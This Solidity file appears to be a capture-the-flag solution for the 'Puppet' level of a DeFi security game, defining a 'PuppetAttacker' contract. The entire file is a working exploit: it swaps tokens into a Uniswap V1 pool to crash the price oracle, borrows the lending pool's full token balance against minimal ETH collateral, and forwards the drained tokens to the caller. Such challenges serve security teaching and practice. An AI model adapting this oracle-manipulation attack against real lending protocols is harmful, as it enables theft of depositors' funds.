pragma solidity ^0.8.0;

interface UniswapV1 {
    function ethToTokenSwapOutput(uint256 tokens_bought,uint256 deadline) external payable returns (uint256);
    function tokenToEthSwapOutput(uint256 eth_bought,uint256 max_tokens,uint256 deadline) external payable returns (uint256);
}

interface IToken {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IPool{
    function borrow(uint256 borrowAmount) external payable;

}
contract PuppetAttacker {

    UniswapV1 private uniswap;
    IToken private dvt;
    IPool private pool;

    constructor(address uniswapAddress, address tokenAddress,address poolAddress) {
        uniswap = UniswapV1(uniswapAddress);
        dvt = IToken(tokenAddress);
        pool = IPool(poolAddress);
    }

    function attack() external payable{
        uint256 dvtAmount = dvt.balanceOf(address(this));
        dvt.approve(address(uniswap),dvtAmount);
        uniswap.tokenToEthSwapOutput(9.9 ether,dvtAmount,block.timestamp + 1000000);
        uint256 poolAmount = dvt.balanceOf(address(pool));
        pool.borrow{value:25 ether}(poolAmount);
        dvtAmount = dvt.balanceOf(address(this));
        dvt.transfer(msg.sender,dvtAmount);
    }

    receive() external payable {}
}